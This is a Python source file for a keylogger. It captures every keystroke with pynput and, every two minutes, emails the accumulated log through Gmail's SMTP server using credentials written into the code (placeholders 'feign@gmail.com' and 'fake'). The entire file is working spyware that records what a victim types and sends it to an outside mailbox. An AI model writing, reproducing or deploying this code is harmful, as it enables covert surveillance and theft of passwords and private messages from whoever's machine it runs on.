#!/root/anaconda3/bin  python

import pynput
import threading
import requests
import subprocess
import smtplib
import ssl
import tempfile
import os
from email.mime.text import MIMEText


class Keylogger(object):

    def __init__(self, interval, email, password):
        self.log = 'Keylogger is started:'
        self.interval = interval
        self.email = email
        self.password = password

    def process_key_press(self, key):
        try:
            self.log += f'{str(key.char)}'
        except AttributeError:
            if key != key.space:
                self.log += f'{str(key)} '
            else:
                self.log += f' {str(key)} '

    def report(self):
        self.send_email_via_gmail_smtp_service_use_smtplib()
        self.log = ''
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(
            on_press=self.process_key_press)
        with keyboard_listener as k:
            self.report()
            k.join()

    def send_email_via_gmail_smtp_service_use_smtplib(self):
        # create MIMEText object which represent the email message.
        msg = MIMEText(f"\n\n{self.log}", 'plain', 'utf-8')
        # set email message from, to and subject attribute value.
        msg['From'] = self.email
        msg['To'] = self.email
        msg['Subject'] = 'Email sent through gmail smtp server.'

        # create a ssl context object because gmail need ssl access.
        ctx = ssl.create_default_context(
            ssl.Purpose.SERVER_AUTH, cafile=None, capath=None, cadata=None)
        # start ssl encryption from very beginning.
        # print('starting connect gmail smtp server with ssl.')
        # smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465, context=ctx)
        # create SMTP connection object.
        smtp_server = smtplib.SMTP('smtp.gmail.com', 587)
        # start tls to make the connection secure.
        smtp_server.starttls(context=ctx)
        # print('start login gmail smtp server.')
        smtp_server.login(self.email, self.password)
        # print('start send message through gmail service.')
        smtp_server.send_message(msg, self.email, self.email)
        # print('Send email by python smtplib module through gmail smtp service complete.')


if __name__ == '__main__':
    k_logger = Keylogger(60*2, 'feign@gmail.com', 'fake')
    k_logger.start()
